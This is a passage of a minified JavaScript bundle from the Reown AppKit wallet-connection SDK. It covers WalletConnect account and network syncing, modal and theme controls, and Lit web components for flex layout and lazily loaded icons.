t?.getAccounts({namespace:e,id:o.id});c&&c.accounts.length>0?this.setAllAccounts(c.accounts,e):this.setAllAccounts([Ze.createAccount(e,a.address,"eoa")],e),this.syncProvider({...a,chainNamespace:e}),await this.syncAccount({...a,chainNamespace:e}),this.setStatus("connected",e)}else this.setStatus("disconnected",e)}catch{this.setStatus("disconnected",e)}}async syncWalletConnectAccount(){const e=this.chainNamespaces.map(async t=>{const i=this.getAdapter(t),n=this.universalProvider?.session?.namespaces?.[t]?.accounts||[],s=de.state.activeCaipNetwork?.id,o=n.find(a=>{const{chainId:c}=uf.parseCaipAddress(a);return c===s?.toString()})||n[0];if(o){const a=uf.validateCaipAddress(o),{chainId:c,address:l}=uf.parseCaipAddress(a);if(An.setProviderId(t,bf.CONNECTOR_TYPE_WALLET_CONNECT),this.caipNetworks&&de.state.activeCaipNetwork&&i?.namespace!==Ht.CHAIN.EVM){const u=i?.getWalletConnectProvider({caipNetworks:this.getCaipNetworks(),provider:this.universalProvider,activeCaipNetwork:de.state.activeCaipNetwork});An.setProvider(t,u)}else An.setProvider(t,this.universalProvider);We.setConnectorId(Ht.CONNECTOR_ID.WALLET_CONNECT,t),Bt.addConnectedNamespace(t),this.syncWalletConnectAccounts(t),await this.syncAccount({address:l,chainId:c,chainNamespace:t})}else this.setStatus("disconnected",t);this.syncConnectedWalletInfo(t),await de.setApprovedCaipNetworksData(t)});await Promise.all(e)}syncWalletConnectAccounts(e){const t=this.universalProvider?.session?.namespaces?.[e]?.accounts?.map(i=>{const{address:n}=uf.parseCaipAddress(i);return n}).filter((i,n,s)=>s.indexOf(i)===n);t&&this.setAllAccounts(t.map(i=>Ze.createAccount(e,i,e==="bip122"?"payment":"eoa")),e)}syncProvider({type:e,provider:t,id:i,chainNamespace:n}){An.setProviderId(n,e),An.setProvider(n,t),We.setConnectorId(i,n)}async syncAllAccounts(e){const t=We.getConnectorId(e);if(!t)return;const n=await this.getAdapter(e)?.getAccounts({namespace:e,id:t});n&&n.accounts.length>0&&this.setAllAccounts(n.accounts,e)}async syncAccount(e){const t=e.chainNamespace===de.state.activeChain,i=de.getCaipNetworkByNamespace(e.chainNamespace,e.chainId),{address:n,chainId:s,chainNamespace:o}=e,{chainId:a}=Bt.getActiveNetworkProps(),c=s||a,l=de.state.activeCaipNetwork?.name===Ht.UNSUPPORTED_NETWORK_NAME,u=de.getNetworkProp("supportsAllNetworks",o);if(this.setStatus("connected",o),!(l&&!u)&&c){let d=this.getCaipNetworks().find(p=>p.id.toString()===c.toString()),h=this.getCaipNetworks().find(p=>p.chainNamespace===o);if(!u&&!d&&!h){const p=this.getApprovedCaipNetworkIds()||[],g=p.find(m=>uf.parseCaipNetworkId(m)?.chainId===c.toString()),w=p.find(m=>uf.parseCaipNetworkId(m)?.chainNamespace===o);d=this.getCaipNetworks().find(m=>m.caipNetworkId===g),h=this.getCaipNetworks().find(m=>m.caipNetworkId===w||"deprecatedCaipNetworkId"in m&&m.deprecatedCaipNetworkId===w)}const f=d||h;f?.chainNamespace===de.state.activeChain?Be.state.enableNetworkSwitch&&!Be.state.allowUnsupportedChain&&de.state.activeCaipNetwork?.name===Ht.UNSUPPORTED_NETWORK_NAME?de.showUnsupportedChainUI():this.setCaipNetwork(f):t||i&&this.setCaipNetworkOfNamespace(i,o),this.syncConnectedWalletInfo(o),EB.isLowerCaseMatch(n,qt.state.address)||this.syncAccountInfo(n,f?.id,o),t?await this.syncBalance({address:n,chainId:f?.id,chainNamespace:o}):await this.syncBalance({address:n,chainId:i?.id,chainNamespace:o})}}async syncAccountInfo(e,t,i){const n=this.getCaipAddress(i),s=t||n?.split(":")[1];if(!s)return;const o=`${i}:${s}:${e}`;this.setCaipAddress(o,i),await this.syncIdentity({address:e,chainId:s,chainNamespace:i})}async syncReownName(e,t){try{const i=await this.getReownName(e);if(i[0]){const n=i[0];this.setProfileName(n.name,t)}else this.setProfileName(null,t)}catch{this.setProfileName(null,t)}}syncConnectedWalletInfo(e){const t=We.getConnectorId(e),i=An.getProviderId(e);if(i===bf.CONNECTOR_TYPE_ANNOUNCED||i===bf.CONNECTOR_TYPE_INJECTED){if(t){const n=this.getConnectors().find(s=>s.id===t);if(n){const{info:s,name:o,imageUrl:a}=n,c=a||this.getConnectorImage(n);this.setConnectedWalletInfo({name:o,icon:c,...s},e)}}}else if(i===bf.CONNECTOR_TYPE_WALLET_CONNECT){const n=An.getProvider(e);n?.session&&this.setConnectedWalletInfo({...n.session.peer.metadata,name:n.session.peer.metadata.name,icon:n.session.peer.metadata.icons?.[0]},e)}else if(t&&t===Ht.CONNECTOR_ID.COINBASE){const n=this.getConnectors().find(s=>s.id===Ht.CONNECTOR_ID.COINBASE);this.setConnectedWalletInfo({name:"Coinbase Wallet",icon:this.getConnectorImage(n)},e)}}async syncBalance(e){!ase.getNetworksByNamespace(this.getCaipNetworks(),e.chainNamespace).find(i=>i.id.toString()===e.chainId?.toString())||!e.chainId||await this.updateNativeBalance(e.address,e.chainId,e.chainNamespace)}async ready(){await this.readyPromise}async updateNativeBalance(e,t,i){const n=this.getAdapter(i),s=de.getCaipNetworkByNamespace(i,t);if(n){const o=await n.getBalance({address:e,chainId:t,caipNetwork:s,tokens:this.options.tokens});return this.setBalance(o.balance,o.symbol,i),o}}async initializeUniversalAdapter(){const e=Mdt.createLogger((i,...n)=>{i&&this.handleAlertError(i),console.error(...n)}),t={projectId:this.options?.projectId,metadata:{name:this.options?.metadata?this.options?.metadata.name:"",description:this.options?.metadata?this.options?.metadata.description:"",url:this.options?.metadata?this.options?.metadata.url:"",icons:this.options?.metadata?this.options?.metadata.icons:[""]},logger:e};Be.setManualWCControl(!!this.options?.manualWCControl),this.universalProvider=this.options.universalProvider??await CB.init(t),this.listenWalletConnect()}listenWalletConnect(){this.universalProvider&&(this.universalProvider.on("display_uri",e=>{ut.setUri(e)}),this.universalProvider.on("connect",ut.finalizeWcConnection),this.universalProvider.on("disconnect",()=>{this.chainNamespaces.forEach(e=>{this.resetAccount(e)}),ut.resetWcConnection()}),this.universalProvider.on("chainChanged",e=>{const t=this.getCaipNetworks().find(n=>n.id==e),i=this.getCaipNetwork();if(!t){this.setUnsupportedNetwork(e);return}i?.id!==t?.id&&this.setCaipNetwork(t)}),this.universalProvider.on("session_event",e=>{if(P9.isSessionEventData(e)){const{name:t,data:i}=e.params.event;t==="accountsChanged"&&Array.isArray(i)&&Ze.isCaipAddress(i[0])&&this.syncAccount(uf.parseCaipAddress(i[0]))}}))}createUniversalProvider(){return!this.universalProviderInitPromise&&Ze.isClient()&&this.options?.projectId&&(this.universalProviderInitPromise=this.initializeUniversalAdapter()),this.universalProviderInitPromise}async getUniversalProvider(){if(!this.universalProvider)try{await this.createUniversalProvider()}catch(e){Hr.sendEvent({type:"error",event:"INTERNAL_SDK_ERROR",properties:{errorType:"UniversalProviderInitError",errorMessage:e instanceof Error?e.message:"Unknown",uncaught:!1}}),console.error("AppKit:getUniversalProvider - Cannot create provider",e)}return this.universalProvider}handleAlertError(e){const t=Object.entries(Sm.UniversalProviderErrors).find(([,{message:a}])=>e.message.includes(a)),[i,n]=t??[],{message:s,alertErrorKey:o}=n??{};if(i&&s&&!this.reportedAlertErrors[i]){const a=Sm.ALERT_ERRORS[o];a&&(ou.open(a,"error"),this.reportedAlertErrors[i]=!0)}}getAdapter(e){if(e)return this.chainAdapters?.[e]}createAdapter(e){if(!e)return;const t=e.namespace;if(!t)return;this.createClients();const i=e;i.namespace=t,i.construct({namespace:t,projectId:this.options?.projectId,networks:this.getCaipNetworks()}),this.chainNamespaces.includes(t)||this.chainNamespaces.push(t),this.chainAdapters&&(this.chainAdapters[t]=i)}async open(e){if(await this.injectModalUi(),e?.uri&&ut.setUri(e.uri),e?.arguments)switch(e?.view){case"Swap":return Ri.open({...e,data:{swap:e.arguments}})}return Ri.open(e)}async close(){await this.injectModalUi(),Ri.close()}setLoading(e,t){Ri.setLoading(e,t)}async disconnect(e){await ut.disconnect(e)}getSIWX(){return Be.state.siwx}getError(){return""}getChainId(){return de.state.activeCaipNetwork?.id}async switchNetwork(e){const t=this.getCaipNetworks().find(i=>i.id===e.id);if(!t){ou.open(Sm.ALERT_ERRORS.SWITCH_NETWORK_NOT_FOUND,"error");return}await de.switchActiveNetwork(t)}getWalletProvider(){return de.state.activeChain?An.state.providers[de.state.activeChain]:null}getWalletProviderType(){return An.getProviderId(de.state.activeChain)}subscribeProviders(e){return An.subscribeProviders(e)}getThemeMode(){return ao.state.themeMode}getThemeVariables(){return ao.state.themeVariables}setThemeMode(e){ao.setThemeMode(e),Xoe(ao.state.themeMode)}setTermsConditionsUrl(e){Be.setTermsConditionsUrl(e)}setPrivacyPolicyUrl(e){Be.setPrivacyPolicyUrl(e)}setThemeVariables(e){ao.setThemeVariables(e),Udt(ao.state.themeVariables)}subscribeTheme(e){return ao.subscribe(e)}getWalletInfo(){return qt.state.connectedWalletInfo}getAccount(e){const t=We.getAuthConnector(e),i=de.getAccountData(e),n=de.state.activeChain,s=Bt.getConnectedConnectorId(e||n);if(i)return{allAccounts:i.allAccounts,caipAddress:i.caipAddress,address:Ze.getPlainAddress(i.caipAddress),isConnected:!!i.caipAddress,status:i.status,embeddedWalletInfo:t&&s===Ht.CONNECTOR_ID.AUTH?{user:i.user?{...i.user,username:Bt.getConnectedSocialUsername()}:void 0,authProvider:i.socialProvider||"email",accountType:i.preferredAccountTypes?.[e||n],isSmartAccountDeployed:!!i.smartAccountDeployed}:void 0}}subscribeAccount(e,t){const i=()=>{const n=this.getAccount(t);n&&e(n)};t?de.subscribeChainProp("accountState",i,t):de.subscribe(i),We.subscribe(i)}subscribeNetwork(e){return de.subscribe(({activeCaipNetwork:t})=>{e({caipNetwork:t,chainId:t?.id,caipNetworkId:t?.caipNetworkId})})}subscribeWalletInfo(e){return qt.subscribeKey("connectedWalletInfo",e)}subscribeShouldUpdateToAddress(e){qt.subscribeKey("shouldUpdateToAddress",e)}subscribeCaipNetworkChange(e){de.subscribeKey("activeCaipNetwork",e)}getState(){return Zf.state}subscribeState(e){return Zf.subscribe(e)}showErrorMessage(e){ts.showError(e)}showSuccessMessage(e){ts.showSuccess(e)}getEvent(){return{...Hr.state}}subscribeEvents(e){return Hr.subscribe(e)}replace(e){tt.replace(e)}redirect(e){tt.push(e)}popTransactionStack(e){tt.popTransactionStack(e)}isOpen(){return Ri.state.open}isTransactionStackEmpty(){return tt.state.transactionStack.length===0}static getInstance(){return this.instance}updateFeatures(e){Be.setFeatures(e)}updateRemoteFeatures(e){Be.setRemoteFeatures(e)}updateOptions(e){const i={...Be.state||{},...e};Be.setOptions(i)}setConnectMethodsOrder(e){Be.setConnectMethodsOrder(e)}setWalletFeaturesOrder(e){Be.setWalletFeaturesOrder(e)}setCollapseWallets(e){Be.setCollapseWallets(e)}setSocialsOrder(e){Be.setSocialsOrder(e)}getConnectMethodsOrder(){return Og.getConnectOrderMethod(Be.state.features,We.getConnectors())}addNetwork(e,t){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);const i=this.extendCaipNetwork(t,this.options);this.getCaipNetworks().find(n=>n.id===i.id)||de.addNetwork(i)}removeNetwork(e,t){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);this.getCaipNetworks().find(n=>n.id===t)&&de.removeNetwork(e,t)}}let WG=!1;class tae extends Gdt{async open(e){We.isConnected()||await super.open(e)}async close(){await super.close(),this.options.manualWCControl&&ut.finalizeWcConnection()}async syncIdentity(e){return Promise.resolve()}async syncBalance(e){return Promise.resolve()}async injectModalUi(){if(!WG&&Ze.isClient()){if(await Ke(()=>Promise.resolve().then(()=>Xht),void 0),await Ke(()=>Promise.resolve().then(()=>g0t),void 0),!document.querySelector("w3m-modal")){const t=document.createElement("w3m-modal");!Be.state.disableAppend&&!Be.state.enableEmbedded&&document.body.insertAdjacentElement("beforeend",t)}WG=!0}}}const Zdt="1.7.8";function Ydt(r){return new tae({...r,basic:!0,sdkVersion:`html-core-${Zdt}`})}const Jdt=Object.freeze(Object.defineProperty({__proto__:null,AppKit:tae,createAppKit:Ydt},Symbol.toStringTag,{value:"Module"})),Qdt=ge`
  :host {
    display: flex;
    width: inherit;
    height: inherit;
  }
`;var Nc=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ta=class extends he{render(){return this.style.cssText=`
      flex-direction: ${this.flexDirection};
      flex-wrap: ${this.flexWrap};
      flex-basis: ${this.flexBasis};
      flex-grow: ${this.flexGrow};
      flex-shrink: ${this.flexShrink};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Us.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Us.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Us.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Us.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Us.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Us.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Us.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Us.getSpacingStyles(this.margin,3)};
    `,F`<slot></slot>`}};ta.styles=[Ii,Qdt];Nc([V()],ta.prototype,"flexDirection",void 0);Nc([V()],ta.prototype,"flexWrap",void 0);Nc([V()],ta.prototype,"flexBasis",void 0);Nc([V()],ta.prototype,"flexGrow",void 0);Nc([V()],ta.prototype,"flexShrink",void 0);Nc([V()],ta.prototype,"alignItems",void 0);Nc([V()],ta.prototype,"justifyContent",void 0);Nc([V()],ta.prototype,"columnGap",void 0);Nc([V()],ta.prototype,"rowGap",void 0);Nc([V()],ta.prototype,"gap",void 0);Nc([V()],ta.prototype,"padding",void 0);Nc([V()],ta.prototype,"margin",void 0);ta=Nc([Ot("wui-flex")],ta);/**
 * @license
 * Copyright 2021 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */class Xdt{constructor(e){this.G=e}disconnect(){this.G=void 0}reconnect(e){this.G=e}deref(){return this.G}}class eht{constructor(){this.Y=void 0,this.Z=void 0}get(){return this.Y}pause(){this.Y??=new Promise(e=>this.Z=e)}resume(){this.Z?.(),this.Y=this.Z=void 0}}/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const HG=r=>!O$e(r)&&typeof r.then=="function",VG=1073741823;class tht extends Eee{constructor(){super(...arguments),this._$Cwt=VG,this._$Cbt=[],this._$CK=new Xdt(this),this._$CX=new eht}render(...e){return e.find(t=>!HG(t))??h0}update(e,t){const i=this._$Cbt;let n=i.length;this._$Cbt=t;const s=this._$CK,o=this._$CX;this.isConnected||this.disconnected();for(let a=0;a<t.length&&!(a>this._$Cwt);a++){const c=t[a];if(!HG(c))return this._$Cwt=a,c;a<n&&c===i[a]||(this._$Cwt=VG,n=0,Promise.resolve(c).then(async l=>{for(;o.get();)await o.get();const u=s.deref();if(u!==void 0){const d=u._$Cbt.indexOf(c);d>-1&&d<u._$Cwt&&(u._$Cwt=d,u.setValue(l))}}))}return h0}disconnected(){this._$CK.disconnect(),this._$CX.pause()}reconnected(){this._$CK.reconnect(this),this._$CX.resume()}}const rht=OR(tht);class iht{constructor(){this.cache=new Map}set(e,t){this.cache.set(e,t)}get(e){return this.cache.get(e)}has(e){return this.cache.has(e)}delete(e){this.cache.delete(e)}clear(){this.cache.clear()}}const DT=new iht,nht=ge`
  :host {
    display: flex;
    aspect-ratio: var(--local-aspect-ratio);
    color: var(--local-color);
    width: var(--local-width);
  }

  svg {
    width: inherit;
    height: inherit;
    object-fit: contain;
    object-position: center;
  }

  .fallback {
    width: var(--local-width);
    height: var(--local-height);
  }
`;var u6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const KG={add:async()=>(await Ke(async()=>{const{addSvg:r}=await Promise.resolve().then(()=>w0t);return{addSvg:r}},void 0)).addSvg,allWallets:async()=>(await Ke(async()=>{const{allWalletsSvg:r}=await Promise.resolve().then(()=>v0t);return{allWalletsSvg:r}},void 0)).allWalletsSvg,arrowBottomCircle:async()=>(await Ke(async()=>{const{arrowBottomCircleSvg:r}=await Promise.resolve().then(()=>x0t);return{arrowBottomCircleSvg:r}},void 0)).arrowBottomCircleSvg,appStore:async()=>(await Ke(async()=>{const{appStoreSvg:r}=await Promise.resolve().then(()=>E0t);return{appStoreSvg:r}},void 0)).appStoreSvg,apple:async()=>(await Ke(async()=>{const{appleSvg:r}=await Promise.resolve().then(()=>S0t);return{appleSvg:r}},void 0)).appleSvg,arrowBottom:async()=>(await Ke(async()=>{const{arrowBottomSvg:r}=await Promise.resolve().then(()=>I0t);return{arrowBottomSvg:r}},void 0)).arrowBottomSvg,arrowLeft:async()=>(await Ke(async()=>{const{arrowLeftSvg:r}=await Promise.resolve().then(()=>k0t);return{arrowLeftSvg:r}},void 0)).arrowLeftSvg,arrowRight:async()=>(await Ke(async()=>{const{arrowRightSvg:r}=await Promise.resolve().then(()=>P0t);return{arrowRightSvg:r}},void 0)).arrowRightSvg,arrowTop:async()=>(await Ke(async()=>{const{arrowTopSvg:r}=await Promise.resolve().then(()=>R0t);return{arrowTopSvg:r}},void 0)).arrowTopSvg,bank:async()=>(await Ke(async()=>{const{bankSvg:r}=await Promise.resolve().then(()=>B0t);return{bankSvg:r}},void 0)).bankSvg,browser:async()=>(await Ke(async()=>{const{browserSvg:r}=await Promise.resolve().then(()=>D0t);return{browserSvg:r}},void 0)).browserSvg,card:async()=>(await Ke(async()=>{const{cardSvg:r}=await Promise.resolve().then(()=>U0t);return{cardSvg:r}},void 0)).cardSvg,checkmark:async()=>(await Ke(async()=>{const{checkmarkSvg:r}=await Promise.resolve().then(()=>F0t);return{checkmarkSvg:r}},void 0)).checkmarkSvg,checkmarkBold:async()=>(await Ke(async()=>{const{checkmarkBoldSvg:r}=await Promise.resolve().then(()=>z0t);return{checkmarkBoldSvg:r}},void 0)).checkmarkBoldSvg,chevronBottom:async()=>(await Ke(async()=>{const{chevronBottomSvg:r}=await Promise.resolve().then(()=>H0t);return{chevronBottomSvg:r}},void 0)).chevronBottomSvg,chevronLeft:async()=>(await Ke(async()=>{const{chevronLeftSvg:r}=await Promise.resolve().then(()=>K0t);return{chevronLeftSvg:r}},void 0)).chevronLeftSvg,chevronRight:async()=>(await Ke(async()=>{const{chevronRightSvg:r}=await Promise.resolve().then(()=>Z0t);return{chevronRightSvg:r}},void 0)).chevronRightSvg,chevronTop:async()=>(await Ke(async()=>{const{chevronTopSvg:r}=await Promise.resolve().then(()=>J0t);return{chevronTopSvg:r}},void 0)).chevronTopSvg,chromeStore:async()=>(await Ke(async()=>{const{chromeStoreSvg:r}=await Promise.resolve().then(()=>X0t);return{chromeStoreSvg:r}},void 0)).chromeStoreSvg,clock:async()=>(await Ke(async()=>{const{clockSvg:r}=await Promise.resolve().then(()=>tft);return{clockSvg:r}},void 0)).clockSvg,close:async()=>(await Ke(async()=>{const{closeSvg:r}=await Promise.resolve().then(()=>ift);return{closeSvg:r}},void 0)).closeSvg,compass:async()=>(await Ke(async()=>{const{compassSvg:r}=await Promise.resolve().then(()=>sft);return{compassSvg:r}},void 0)).compassSvg,coinPlaceholder:async()=>(await Ke(async()=>{const{coinPlaceholderSvg:r}=await Promise.resolve().then(()=>aft);return{coinPlaceholderSvg:r}},void 0)).coinPlaceholderSvg,copy:async()=>(await Ke(async()=>{const{copySvg:r}=await Promise.resolve().then(()=>lft);return{copySvg:r}},void 0)).copySvg,cursor:async()=>(await Ke(async()=>{const{cursorSvg:r}=await Promise.resolve().then(()=>dft);return{cursorSvg:r}},void 0)).cursorSvg,cursorTransparent:async()=>(await Ke(async()=>{const{cursorTransparentSvg:r}=await Promise.resolve().then(()=>fft);return{cursorTransparentSvg:r}},void 0)).cursorTransparentSvg,desktop:async()=>(await Ke(async()=>{const{desktopSvg:r}=await Promise.resolve().then(()=>gft);return{desktopSvg:r}},void 0)).desktopSvg,disconnect:async()=>(await Ke(async()=>{const{disconnectSvg:r}=await Promise.resolve().then(()=>wft);return{disconnectSvg:r}},void 0)).disconnectSvg,discord:async()=>(await Ke(async()=>{const{discordSvg:r}=await Promise.resolve().then(()=>vft);return{discordSvg:r}},void 0)).discordSvg,etherscan:async()=>(await Ke(async()=>{const{etherscanSvg:r}=await Promise.resolve().then(()=>xft);return{etherscanSvg:r}},void 0)).etherscanSvg,extension:async()=>(await Ke(async()=>{const{extensionSvg:r}=await Promise.resolve().then(()=>Eft);return{extensionSvg:r}},void 0)).extensionSvg,externalLink:async()=>(await Ke(async()=>{const{externalLinkSvg:r}=await Promise.resolve().then(()=>Sft);return{externalLinkSvg:r}},void 0)).externalLinkSvg,facebook:async()=>(await Ke(async()=>{const{facebookSvg:r}=await Promise.resolve().then(()=>Ift);return{facebookSvg:r}},void 0)).facebookSvg,farcaster:async()=>(await Ke(async()=>{const{farcasterSvg:r}=await Promise.resolve().then(()=>kft);return{farcasterSvg:r}},void 0)).farcasterSvg,filters:async()=>(await Ke(async()=>{const{filtersSvg:r}=await Promise.resolve().then(()=>Pft);return{filtersSvg:r}},void 0)).filtersSvg,github:async()=>(await Ke(async()=>{const{githubSvg:r}=await Promise.resolve().then(()=>Rft);return{githubSvg:r}},void 0)).githubSvg,google:async()=>(await Ke(async()=>{const{googleSvg:r}=await Promise.resolve().then(()=>Bft);return{googleSvg:r}},void 0)).googleSvg,helpCircle:async()=>(await Ke(async()=>{const{helpCircleSvg:r}=await Promise.resolve().then(()=>Dft);return{helpCircleSvg:r}},void 0)).helpCircleSvg,image:async()=>(await Ke(async()=>{const{imageSvg:r}=await Promise.resolve().then(()=>Uft);return{imageSvg:r}},void 0)).imageSvg,id:async()=>(await Ke(async()=>{const{idSvg:r}=await Promise.resolve().then(()=>Fft);return{idSvg:r}},void 0)).idSvg,infoCircle:async()=>(await Ke(async()=>{const{infoCircleSvg:r}=await Promise.resolve().then(()=>zft);return{infoCircleSvg:r}},void 0)).infoCircleSvg,lightbulb:async()=>(await Ke(async()=>{const{lightbulbSvg:r}=await Promise.resolve().then(()=>Hft);return{lightbulbSvg:r}},void 0)).lightbulbSvg,mail:async()=>(await Ke(async()=>{const{mailSvg:r}=await Promise.resolve().then(()=>Kft);return{mailSvg:r}},void 0)).mailSvg,mobile:async()=>(await Ke(async()=>{const{mobileSvg:r}=await Promise.resolve().then(()=>Zft);return{mobileSvg:r}},void 0)).mobileSvg,more:async()=>(await Ke(async()=>{const{moreSvg:r}=await Promise.resolve().then(()=>Jft);return{moreSvg:r}},void 0)).moreSvg,networkPlaceholder:async()=>(await Ke(async()=>{const{networkPlaceholderSvg:r}=await Promise.resolve().then(()=>Xft);return{networkPlaceholderSvg:r}},void 0)).networkPlaceholderSvg,nftPlaceholder:async()=>(await Ke(async()=>{const{nftPlaceholderSvg:r}=await Promise.resolve().then(()=>tpt);return{nftPlaceholderSvg:r}},void 0)).nftPlaceholderSvg,off:async()=>(await Ke(async()=>{const{offSvg:r}=await Promise.resolve().then(()=>ipt);return{offSvg:r}},void 0)).offSvg,playStore:async()=>(await Ke(async()=>{const{playStoreSvg:r}=await Promise.resolve().then(()=>spt);return{playStoreSvg:r}},void 0)).playStoreSvg,plus:async()=>(await Ke(async()=>{const{plusSvg:r}=await Promise.resolve().then(()=>apt);return{plusSvg:r}},void 0)).plusSvg,qrCode:async()=>(await Ke(async()=>{const{qrCodeIcon:r}=await Promise.resolve().then(()=>lpt);return{qrCodeIcon:r}},void 0)).qrCodeIcon,recycleHorizontal:async()=>(await Ke(async()=>{const{recycleHorizontalSvg:r}=await Promise.resolve().then(()=>dpt);return{recycleHorizontalSvg:r}},void 0)).recycleHorizontalSvg,refresh:async()=>(await Ke(async()=>{const{refreshSvg:r}=await Promise.resolve().then(()=>fpt);return{refreshSvg:r}},void 0)).refreshSvg,search:async()=>(await Ke(async()=>{const{searchSvg:r}=await Promise.resolve().then(()=>gpt);return{searchSvg:r}},void 0)).searchSvg,send:async()=>(await Ke(async()=>{const{sendSvg:r}=await Promise.resolve().then(()=>wpt);return{sendSvg:r}},void 0)).sendSvg,swapHorizontal:async()=>(await Ke(async()=>{const{swapHorizontalSvg:r}=await Promise.resolve().then(()=>vpt);return{swapHorizontalSvg:r}},void 0)).swapHorizontalSvg,swapHorizontalMedium:async()=>(await Ke(async()=>{const{swapHorizontalMediumSvg:r}=await Promise.resolve().then(()=>xpt);return{swapHorizontalMediumSvg:r}},void 0)).swapHorizontalMediumSvg,swapHorizontalBold:async()=>(await Ke(async()=>{const{swapHorizontalBoldSvg:r}=await Promise.resolve().then(()=>Ept);return{swapHorizontalBoldSvg:r}},void 0)).swapHorizontalBoldSvg,swapHorizontalRoundedBold:async()=>(await Ke(async()=>{const{swapHorizontalRoundedBoldSvg:r}=await Promise.resolve().then(()=>Spt);return{swapHorizontalRoundedBoldSvg:r}},void 0)).swapHorizontalRoundedBoldSvg,swapVertical:async()=>(await Ke(async()=>{const{swapVerticalSvg:r}=await Promise.resolve().then(()=>Ipt);return{swapVerticalSvg:r}},void 0)).swapVerticalSvg,telegram:async()=>(await Ke(async()=>{const{telegramSvg:r}=await Promise.resolve().then(()=>kpt);return{telegramSvg:r}},void 0)).telegramSvg,threeDots:async()=>(await Ke(async()=>{const{threeDotsSvg:r}=await Promise.resolve().then(()=>Ppt);return{threeDotsSvg:r}},void 0)).threeDotsSvg,twitch:async()=>(await Ke(async()=>{const{twitchSvg:r}=await Promise.resolve().then(()=>Rpt);return{twitchSvg:r}},void 0)).twitchSvg,twitter:async()=>(await Ke(async()=>{const{xSvg:r}=await Promise.resolve().then(()=>tZ);return{xSvg:r}},void 0)).xSvg,twitterIcon:async()=>(await Ke(async()=>{const{twitterIconSvg:r}=await Promise.resolve().then(()=>Mpt);return{twitterIconSvg:r}},void 0)).twitterIconSvg,verify:async()=>(await Ke(async()=>{const{verifySvg:r}=await Promise.resolve().then(()=>Lpt);return{verifySvg:r}},void 0)).verifySvg,verifyFilled:async()=>(await Ke(async()=>{const{verifyFilledSvg:r}=await Promise.resolve().then(()=>jpt);return{verifyFilledSvg:r}},void 0)).verifyFilledSvg,wallet:async()=>(await Ke(async()=>{const{walletSvg:r}=await Promise.resolve().then(()=>qpt);return{walletSvg:r}},void 0)).walletSvg,walletConnect:async()=>(await Ke(async()=>{const{walletConnectSvg:r}=await Promise.resolve().then(()=>FT);return{walletConnectSvg:r}},void 0)).walletConnectSvg,walletConnectLightBrown:async()=>(await Ke(async()=>{const{walletConnectLightBrownSvg:r}=await Promise.resolve().then(()=>FT);return{walletConnectLightBrownSvg:r}},void 0)).walletConnectLightBrownSvg,walletConnectBrown:async()=>(await Ke(async()=>{const{walletConnectBrownSvg:r}=await Promise.resolve().then(()=>FT);return{walletConnectBrownSvg:r}},void 0)).walletConnectBrownSvg,walletPlaceholder:async()=>(await Ke(async()=>{const{walletPlaceholderSvg:r}=await Promise.resolve().then(()=>Kpt);return{walletPlaceholderSvg:r}},void 0)).walletPlaceholderSvg,warningCircle:async()=>(await Ke(async()=>{const{warningCircleSvg:r}=await Promise.resolve().then(()=>Zpt);return{warningCircleSvg:r}},void 0)).warningCircleSvg,x:async()=>(await Ke(async()=>{const{xSvg:r}=await Promise.resolve().then(()=>tZ);return{xSvg:r}},void 0)).xSvg,info:async()=>(await Ke(async()=>{const{infoSvg:r}=await Promise.resolve().then(()=>Jpt);return{infoSvg:r}},void 0)).infoSvg,exclamationTriangle:async()=>(await Ke(async()=>{const{exclamationTriangleSvg:r}=await Promise.resolve().then(()=>Xpt);return{exclamationTriangleSvg:r}},void 0)).exclamationTriangleSvg,reown:async()=>(await Ke(async()=>{const{reownSvg:r}=await Promise.resolve().then(()=>t1t);return{reownSvg:r}},void 0)).reownSvg};async function sht(r){if(DT.has(r))return DT.get(r);const t=(KG[r]??KG.copy)();return DT.set(r,t),t}let Bg=class extends he{constructor(){super(...arguments),this.size="md",this.name="copy",this.color="fg-300",this.aspectRatio="1 / 1"}render(){return this.style.cssText=`
      --local-color: ${`var(--wui-color-${this.color});`}
      --local-width: ${`var(--wui-icon-size-${this.size});`}
      --local-aspect-ratio: ${this.aspectRatio}
    `,F`${rht(sht(this.name),F`<div class="fallback"></div>`)}`}};Bg.styles=[Ii,c6,nht];u6([V()],Bg.prototype,"size",void 0);u6([V()],Bg.prototype,"name",void 0);u6([V()],Bg.prototype,"color",void 0);u6([V()],Bg.prototype,"aspectRatio",void 0);Bg=u6([Ot("wui-icon")],Bg);const oht=ge`
  :host {
    display: inline-flex !important;
  }

  slot {
    width: 100%;
    display: inline-block;
    font-style: normal;
    font-family: var(--wui-font-family);
    font-feature-settings:
      'tnum' on,
      'lnum' on,
      'case' on;
    line-height: 130%;
    font-weight: var(--wui-font-weight-regular);
    overflow: inherit;
    text-overflow: inherit;
    text-align: var(--local-align);
